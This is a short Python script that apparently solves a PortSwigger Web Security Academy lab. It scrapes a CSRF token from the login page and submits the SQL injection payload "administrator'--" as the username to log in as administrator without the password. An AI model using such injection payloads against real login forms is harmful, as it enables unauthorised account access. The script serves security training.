import requests
from bs4 import BeautifulSoup

url = "https://0a97006d03d2ea2f815f1b81000800c3.web-security-academy.net/login"

cookies = {
    "session" : "ogs7IaQixvtOgarGbf4gndvdTmhkgUdF"
}

headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://portswigger.net/",
    "Accept-Language" : "en-US,en;q=0.9"
}

s = requests.Session()
r = s.get(url, headers=headers, cookies=cookies)

soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "username" : "administrator'--",
    "password" : "salam",
    "csrf" : csrf
}

r = requests.post(url, headers=headers, cookies=cookies, data=data)

if "Congratulations, you solved the lab!" in r.text:
    print("Lab is Solved!")
else:
    print("Lab is not SolveD!")

print(r.text)
print(r.status_code)